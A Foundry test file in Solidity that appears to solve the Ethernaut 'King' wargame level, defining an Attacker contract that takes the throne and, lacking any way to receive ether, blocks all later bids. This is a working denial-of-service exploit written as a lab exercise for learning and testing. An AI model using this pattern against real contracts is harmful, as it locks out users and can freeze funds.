// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {King} from "../src/King.sol";

contract Attacker {
    address payable target;
    constructor(address payable _target) payable {
        target = _target;
    }

    function claimThrone() external payable {
        uint256 prize = King(target).prize();
        (bool success,) = target.call{value: prize}("");
        require(success, "Transcation failed");
    }
}

contract KingTest is Test {
    King king;
    Attacker attacker;

    function setUp() public {
        vm.deal(address(this), 5 ether);
        king = new King{value: 1 ether}();
    }

    receive() external payable {}

    function testAttackerCanBlockOthersFromBecomingKing() public {
        // deploy the attck contract
        attacker = new Attacker(payable(address(king)));
        // act as the attcker
        vm.deal(address(attacker), 2 ether);
        vm.startPrank(address(attacker));
        attacker.claimThrone();
        // ownership is claimed
        assertEq(king._king(), address(attacker));
        vm.stopPrank();
        // This blocks other users from becoming the king
        address user = makeAddr("user");
        vm.startPrank(user);
        vm.deal(user, 3 ether);
        vm.expectRevert();
        (bool success,) = address(king).call{value: 3 ether}("");
        require(success);
    }
}